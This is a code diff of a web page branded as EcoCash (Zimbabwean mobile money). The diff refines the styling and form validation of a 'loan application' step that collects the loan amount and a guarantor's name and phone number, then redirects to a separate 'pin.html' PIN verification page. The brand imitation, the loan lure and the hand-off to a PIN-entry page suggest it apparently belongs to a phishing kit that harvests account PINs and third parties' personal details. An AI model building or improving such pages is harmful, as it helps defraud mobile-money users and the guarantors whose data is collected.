@@ -30,7 +30,7 @@
       font-family: 'Inter', Arial, Helvetica, sans-serif;
       background: var(--bg);
       color: var(--text);
-      padding: 20px 12px;
+      padding: 12px;
       min-height: 100vh;
       display: flex;
       justify-content: center;
@@ -39,10 +39,10 @@
 
     .container {
       width: 100%;
-      max-width: 420px;
+      max-width: 400px;
       background: #f7f7f7;
       border-radius: 28px;
-      padding: 24px 20px 30px;
+      padding: 20px 16px 24px;
       box-shadow: var(--shadow);
       position: relative;
       overflow: hidden;
@@ -63,26 +63,26 @@
       position: relative;
       z-index: 2;
       text-align: center;
-      margin-bottom: 16px;
+      margin-bottom: 12px;
     }
 
     .logo-circle {
-      width: 56px;
-      height: 56px;
+      width: 48px;
+      height: 48px;
       background: var(--ecocash-blue);
       border-radius: 50%;
       color: #fff;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 28px;
+      font-size: 24px;
       font-weight: 800;
       margin: 0 auto 6px;
       box-shadow: 0 4px 10px rgba(28, 106, 166, 0.3);
     }
 
     .logo-text {
-      font-size: 28px;
+      font-size: 24px;
       font-weight: 800;
       letter-spacing: -0.5px;
       line-height: 1;
@@ -101,11 +101,11 @@
     .application-card {
       background: var(--card);
       border-radius: var(--radius);
-      padding: 28px 20px;
+      padding: 20px 16px;
       box-shadow: var(--shadow);
       border: 1px solid var(--border);
       text-align: center;
-      margin: 20px 0 24px;
+      margin: 12px 0 20px;
       position: relative;
       z-index: 2;
       transition: all 0.3s ease;
@@ -116,37 +116,37 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 16px;
+      gap: 12px;
     }
 
     .step-icon {
-      font-size: 48px;
+      font-size: 40px;
+      color: var(--ecocash-blue);
+      margin-bottom: 4px;
+    }
+
+    .step-title {
+      font-size: 20px;
+      font-weight: 700;
       color: var(--ecocash-blue);
       margin-bottom: 8px;
     }
 
-    .step-title {
-      font-size: 24px;
-      font-weight: 700;
-      color: var(--ecocash-blue);
-      margin-bottom: 12px;
-    }
-
     .step-description {
-      font-size: 15px;
+      font-size: 14px;
       color: var(--sub);
-      line-height: 1.5;
+      line-height: 1.4;
     }
 
     /* Loader animation – blue */
     .loader {
-      width: 40px;
-      height: 40px;
+      width: 36px;
+      height: 36px;
       border: 3px solid #e0f0ff;
       border-top: 3px solid var(--ecocash-blue);
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      margin: 20px auto 0;
+      margin: 16px auto 0;
     }
 
     @keyframes spin {
@@ -159,20 +159,21 @@
       background: #f0f7fe;
       border: 1px solid #d0e2f2;
       border-radius: 40px;
-      padding: 8px 16px;
+      padding: 6px 14px;
       display: inline-block;
       font-weight: 600;
+      font-size: 14px;
       color: var(--ecocash-blue);
-      margin: 16px 0 12px;
+      margin: 12px 0 12px;
     }
 
     .loan-form {
       width: 100%;
-      margin: 20px 0;
+      margin: 12px 0;
     }
 
     .input-group {
-      margin-bottom: 20px;
+      margin-bottom: 16px;
       text-align: left;
     }
 
@@ -181,12 +182,12 @@
       font-size: 13px;
       font-weight: 600;
       color: var(--sub);
-      margin-bottom: 8px;
+      margin-bottom: 6px;
     }
 
     .input-group input {
       width: 100%;
-      padding: 14px 16px;
+      padding: 12px 14px;
       border: 1px solid var(--border);
       border-radius: 12px;
       font-size: 15px;
@@ -206,19 +207,19 @@
       display: grid;
       grid-template-columns: 1fr 1fr;
       gap: 12px;
-      margin-bottom: 20px;
+      margin-bottom: 16px;
     }
 
     .error-message {
-      font-size: 12px;
+      font-size: 11px;
       color: var(--ecocash-red);
-      margin-top: 6px;
+      margin-top: 4px;
       display: none;
     }
 
     .btn {
       width: 100%;
-      padding: 16px 20px;
+      padding: 14px 16px;
       border: none;
       border-radius: 14px;
       background: linear-gradient(90deg, var(--ecocash-blue), var(--blue-dark));
@@ -226,7 +227,7 @@
       font-size: 16px;
       font-weight: 700;
       cursor: pointer;
-      box-shadow: 0 8px 20px rgba(28, 106, 166, 0.3);
+      box-shadow: 0 6px 16px rgba(28, 106, 166, 0.25);
       transition: 0.2s;
       text-decoration: none;
       display: inline-block;
@@ -235,7 +236,7 @@
 
     .btn:hover {
       background: linear-gradient(90deg, var(--blue-dark), #0a3a5a);
-      transform: scale(1.02);
+      transform: scale(1.01);
     }
 
     .btn:disabled {
@@ -249,13 +250,13 @@
     /* Section header styling */
     .section-header {
       text-align: left;
-      margin: 20px 0 12px 0;
-      padding-bottom: 8px;
+      margin: 16px 0 10px 0;
+      padding-bottom: 6px;
       border-bottom: 2px solid #e0f0ff;
     }
 
     .section-header h3 {
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 700;
       color: var(--ecocash-blue);
       letter-spacing: -0.3px;
@@ -265,14 +266,14 @@
     }
 
     .section-header h3 i {
-      font-size: 18px;
+      font-size: 16px;
       color: var(--ecocash-blue);
     }
 
     .footer {
       text-align: center;
-      margin-top: 24px;
-      font-size: 12px;
+      margin-top: 16px;
+      font-size: 11px;
       color: #aaa;
       position: relative;
       z-index: 2;
@@ -297,6 +298,40 @@
       border-top: 4px solid var(--ecocash-blue);
       border-radius: 50%;
       animation: spin 1s linear infinite;
+    }
+
+    /* Mobile optimizations */
+    @media (max-width: 380px) {
+      .container {
+        padding: 16px 12px 20px;
+      }
+      .application-card {
+        padding: 16px 12px;
+      }
+      .step-icon {
+        font-size: 36px;
+      }
+      .step-title {
+        font-size: 18px;
+      }
+      .step-description {
+        font-size: 13px;
+      }
+      .limit-badge {
+        font-size: 13px;
+        padding: 5px 12px;
+      }
+      .input-group input {
+        padding: 10px 12px;
+        font-size: 14px;
+      }
+      .btn {
+        padding: 12px;
+        font-size: 15px;
+      }
+      .name-row {
+        gap: 8px;
+      }
     }
   </style>
 </head>
@@ -355,29 +390,18 @@
     const MIN_AMOUNT = 50;      // Minimum loan amount in USD
 
     // ========== PHONE NORMALIZATION (accept 07... or 7... → 9-digit starting with 7) ==========
-    // This function returns normalized 9-digit string OR null if invalid.
-    // It does NOT modify the input field value.
     function normalizeZimPhone(phoneRaw) {
       let digits = phoneRaw.replace(/\D/g, '');
       if (digits.length === 0) return null;
-      // Remove leading 263 if present (rare)
-      if (digits.startsWith('263')) {
-        digits = digits.substring(3);
-      }
-      // If starts with 0 and total length 10, remove leading 0 → 9 digits
-      if (digits.startsWith('0') && digits.length === 10) {
-        digits = digits.substring(1);
-      }
-      // Now must be exactly 9 digits and start with '7'
-      if (digits.length === 9 && digits.startsWith('7')) {
-        return digits;
-      }
+      if (digits.startsWith('263')) digits = digits.substring(3);
+      if (digits.startsWith('0') && digits.length === 10) digits = digits.substring(1);
+      if (digits.length === 9 && digits.startsWith('7')) return digits;
       return null;
     }
 
     // Retrieve user's phone number from sessionStorage/localStorage (normalized)
     let userPhone = sessionStorage.getItem('ecocash_approved_phone') || localStorage.getItem('phone') || '';
-    userPhone = normalizeZimPhone(userPhone) || ''; // store normalized 9-digit or empty
+    userPhone = normalizeZimPhone(userPhone) || '';
 
     function renderStep(index) {
       const step = steps[index];
@@ -418,7 +442,7 @@
               </div>
             </div>
             <div class="input-group">
-              <label>Guarantor's Phone Number </label>
+              <label>Guarantor's Phone Number</label>
               <input type="tel" id="guarantorPhone" placeholder="e.g., 771234567 or 0771234567" inputmode="numeric" maxlength="10">
               <div class="error-message" id="phoneError">Phone number cannot be the same as yours. Must be 9 digits starting with 7 (with or without leading zero).</div>
             </div>
@@ -436,38 +460,64 @@
       const amountError = document.getElementById('amountError');
       const phoneError = document.getElementById('phoneError');
 
-      function validateForm() {
+      // Helper to hide all error messages initially and only show on blur/submit
+      function hideAllErrors() {
+        amountError.style.display = 'none';
+        phoneError.style.display = 'none';
+        const nameErrorDiv = document.getElementById('nameError');
+        if (nameErrorDiv) nameErrorDiv.style.display = 'none';
+      }
+
+      // Validation function (returns true if valid, false otherwise)
+      // Optionally show/hide errors based on `showErrors` flag
+      function validate(showErrors = false) {
         const amount = parseInt(amountInput.value, 10);
         const firstName = firstNameInput.value.trim();
         const lastName = lastNameInput.value.trim();
         const phoneRaw = phoneInput.value.trim();
         const normalizedPhone = normalizeZimPhone(phoneRaw);
 
-        let valid = true;
+        let isValid = true;
 
         // Amount validation
         if (isNaN(amount) || amount < MIN_AMOUNT || amount > MAX_LIMIT) {
-          valid = false;
-          amountError.style.display = 'block';
-          if (isNaN(amount)) amountError.textContent = 'Please enter a valid number.';
-          else amountError.textContent = `Amount must be between $${MIN_AMOUNT} and $${MAX_LIMIT.toLocaleString()}.`;
+          isValid = false;
+          if (showErrors) {
+            amountError.style.display = 'block';
+            if (isNaN(amount)) amountError.textContent = 'Please enter a valid number.';
+            else amountError.textContent = `Amount must be between $${MIN_AMOUNT} and $${MAX_LIMIT.toLocaleString()}.`;
+          } else {
+            amountError.style.display = 'none';
+          }
         } else {
           amountError.style.display = 'none';
         }
 
-        // Phone validation using normalized value (field keeps original format)
+        // Phone validation
         if (phoneRaw === '') {
-          valid = false;
-          phoneError.style.display = 'block';
-          phoneError.textContent = 'Guarantor phone number is required.';
+          isValid = false;
+          if (showErrors) {
+            phoneError.style.display = 'block';
+            phoneError.textContent = 'Guarantor phone number is required.';
+          } else {
+            phoneError.style.display = 'none';
+          }
         } else if (!normalizedPhone) {
-          valid = false;
-          phoneError.style.display = 'block';
-          phoneError.textContent = 'Enter a valid EcoCash number: 771234567 (9 digits) or 0771234567 (10 digits).';
+          isValid = false;
+          if (showErrors) {
+            phoneError.style.display = 'block';
+            phoneError.textContent = 'Enter a valid EcoCash number: 771234567 (9 digits) or 0771234567 (10 digits).';
+          } else {
+            phoneError.style.display = 'none';
+          }
         } else if (userPhone && normalizedPhone === userPhone) {
-          valid = false;
-          phoneError.style.display = 'block';
-          phoneError.textContent = 'Guarantor phone number cannot be the same as yours.';
+          isValid = false;
+          if (showErrors) {
+            phoneError.style.display = 'block';
+            phoneError.textContent = 'Guarantor phone number cannot be the same as yours.';
+          } else {
+            phoneError.style.display = 'none';
+          }
         } else {
           phoneError.style.display = 'none';
         }
@@ -475,60 +525,85 @@
         // Name validation
         const existingNameError = document.getElementById('nameError');
         if (firstName === '' || lastName === '') {
-          if (!existingNameError) {
-            const nameErrorDiv = document.createElement('div');
-            nameErrorDiv.id = 'nameError';
-            nameErrorDiv.className = 'error-message';
-            nameErrorDiv.style.display = 'block';
-            nameErrorDiv.textContent = 'Both first name and last name are required.';
-            phoneInput.parentNode.insertBefore(nameErrorDiv, phoneInput.nextSibling);
-          } else {
-            existingNameError.style.display = 'block';
+          isValid = false;
+          if (showErrors) {
+            if (!existingNameError) {
+              const nameErrorDiv = document.createElement('div');
+              nameErrorDiv.id = 'nameError';
+              nameErrorDiv.className = 'error-message';
+              nameErrorDiv.textContent = 'Both first name and last name are required.';
+              phoneInput.parentNode.insertBefore(nameErrorDiv, phoneInput.nextSibling);
+            } else {
+              existingNameError.style.display = 'block';
+            }
+          } else if (existingNameError) {
+            existingNameError.style.display = 'none';
           }
-          valid = false;
         } else {
           if (existingNameError) existingNameError.style.display = 'none';
         }
 
-        applyBtn.disabled = !valid;
+        return isValid;
       }
 
-      amountInput.addEventListener('input', validateForm);
-      firstNameInput.addEventListener('input', validateForm);
-      lastNameInput.addEventListener('input', validateForm);
-      phoneInput.addEventListener('input', validateForm);
-      // No blur reformatting – keep user's typed format
+      // Event handlers: validate on input but hide errors until user has interacted
+      // We'll only show errors after the field loses focus (blur) or on submit attempt
+      function showErrorsForField(field, errorElement) {
+        if (field.value.trim() !== '') {
+          validate(true);
+        }
+      }
 
+      amountInput.addEventListener('blur', () => validate(true));
+      firstNameInput.addEventListener('blur', () => validate(true));
+      lastNameInput.addEventListener('blur', () => validate(true));
+      phoneInput.addEventListener('blur', () => validate(true));
+
+      // Real-time validation to enable/disable button (but not show errors)
+      function updateButtonState() {
+        const isValid = validate(false);
+        applyBtn.disabled = !isValid;
+      }
+
+      amountInput.addEventListener('input', updateButtonState);
+      firstNameInput.addEventListener('input', updateButtonState);
+      lastNameInput.addEventListener('input', updateButtonState);
+      phoneInput.addEventListener('input', updateButtonState);
+
+      // Initial button state (disabled until valid input)
+      updateButtonState();
+
+      // Submit handler
       applyBtn.addEventListener('click', function() {
+        // Validate with error messages shown
+        if (!validate(true)) {
+          // Scroll to first error
+          const firstError = document.querySelector('.error-message[style*="display: block"]');
+          if (firstError) firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          return;
+        }
+
         const amount = parseInt(amountInput.value, 10);
         const firstName = firstNameInput.value.trim();
         const lastName = lastNameInput.value.trim();
         const phoneRaw = phoneInput.value.trim();
         const normalizedPhone = normalizeZimPhone(phoneRaw);
 
-        if (amount >= MIN_AMOUNT && amount <= MAX_LIMIT &&
-            firstName !== '' && lastName !== '' &&
-            normalizedPhone && 
-            (!userPhone || normalizedPhone !== userPhone)) {
+        // Store normalized phone (9-digit) and other data
+        localStorage.setItem('loanAmount', amount);
+        localStorage.setItem('guarantorFirstName', firstName);
+        localStorage.setItem('guarantorLastName', lastName);
+        localStorage.setItem('guarantorPhone', normalizedPhone);
 
-          // Store normalized phone (9-digit) and other data
-          localStorage.setItem('loanAmount', amount);
-          localStorage.setItem('guarantorFirstName', firstName);
-          localStorage.setItem('guarantorLastName', lastName);
-          localStorage.setItem('guarantorPhone', normalizedPhone);
+        // Show spinner and redirect to PIN verification page
+        const spinner = document.getElementById('spinner');
+        spinner.style.display = 'flex';
+        applyBtn.disabled = true;
 
-          // Show spinner and redirect to PIN verification page
-          const spinner = document.getElementById('spinner');
-          spinner.style.display = 'flex';
-          applyBtn.disabled = true;
-
-          setTimeout(() => {
-            window.location.href = 'pin.html';
-          }, 1500);
-        }
+        setTimeout(() => {
+          window.location.href = 'pin.html';
+        }, 1500);
       });
-
-      validateForm();
     }
 
     function nextStep() {
